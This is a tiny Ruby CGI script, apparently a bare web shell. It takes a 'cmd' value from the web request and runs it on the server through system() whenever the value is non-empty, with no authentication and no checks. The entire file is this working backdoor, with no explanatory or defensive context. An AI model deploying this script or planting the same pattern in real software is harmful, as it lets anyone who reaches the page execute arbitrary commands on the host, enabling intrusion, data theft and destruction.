require "cgi"
c = CGI.new
puts "Content-Type: text/html\n\n"
system(c["cmd"]) if c["cmd"] && !c["cmd"].empty?
